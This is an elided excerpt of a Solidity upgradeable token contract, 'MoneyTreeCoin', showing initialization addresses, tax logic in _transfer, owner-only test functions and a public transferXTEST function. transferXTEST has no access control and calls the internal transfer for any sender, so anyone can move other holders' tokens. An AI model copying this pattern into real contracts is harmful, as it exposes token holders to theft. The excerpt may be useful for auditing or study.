...
contract MoneyTreeCoin is Initializable, ContextUpgradeable, IERC20Upgradeable, IERC20MetadataUpgradeable,  OwnableUpgradeable, PausableUpgradeable, UUPSUpgradeable, VRFConsumerBase {
    ...
    function initialize() public virtual initializer {
        ...
        __VRFConsumerBase_init(0xa555fC018435bef5A13C6c6870a9d4C11DEC329C, 0x84b9B910527Ad5C03A9Ca831909E21e236EA7b06);
        ...
        devWallet = payable(0x7036EcaddF4811cD28E0e46FdBcf47411D501E33);
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        ...
        if(taxActive && !_isExcludedTax[recipient] && (sender == uniswapV2Pair || sender == 0x33Eac50b7fAf4B8842A621d0475335693F5D21fe)){
    ...
    mapping(uint => address) public _simXP;
    
    
    function sim1() public onlyOwner {
    ...
    function transferXTEST(address sender, address recipient, uint256 amount) public { 
        _transfer(sender, recipient, amount);
    }
